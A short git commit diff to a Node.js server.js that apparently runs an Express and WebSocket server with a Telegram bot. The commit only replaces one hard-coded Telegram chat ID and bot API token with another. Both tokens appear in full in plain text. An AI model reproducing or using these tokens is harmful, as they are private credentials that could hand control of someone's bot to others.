d4fdd6b01b7994ca4de7f047039eb4524e07d702
Farhankhan78600 <121998339+Farhankhan78600@users.noreply.github.com>
2025-02-01 23:52:27 +0530

    Update server.js

--- server.js
+++ server.js
@@ -5,8 +5,8 @@ const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
 const wss = new socket.Server({server});
-const chatId = '5265371934'
-const token = '5171666407:AAFbQ6iLPo2r9DazrMN9sPhtYdWLy_uxGf8'
+const chatId = '5359191250'
+const token = '7251068485:AAF7FpvOsl1lPMkjb4WbVGzELhsUWTkojLo'
 const serverAddr = ''
 const bot = new TelegramBot(token, {polling: true});
 
